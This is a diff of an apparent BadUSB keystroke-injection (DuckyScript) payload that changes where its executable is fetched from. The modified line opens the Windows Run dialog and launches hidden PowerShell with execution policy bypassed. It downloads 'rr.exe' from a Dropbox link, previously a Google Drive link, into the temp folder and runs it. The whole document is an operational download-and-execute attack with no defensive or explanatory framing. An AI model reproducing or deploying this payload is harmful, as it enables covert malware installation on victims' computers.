@@ -14,5 +14,5 @@ REM     ------------------------------------------------------------------------
 DELAY 2000
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://drive.google.com/uc?export=download&id=1pPwhtyNKed8NMS0AfDvcR8NiglSq5TS8' -O "$D\rr.exe";& "$D\rr.exe"
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://www.dropbox.com/scl/fi/wuwesubik699wqsbutf4e/rr.exe?rlkey=vhx8odabr1mjgenlcq0pymxxb&st=5zpvhyjh&e=1&dl=1' -O "$D\rr.exe";& "$D\rr.exe"
 ENTER
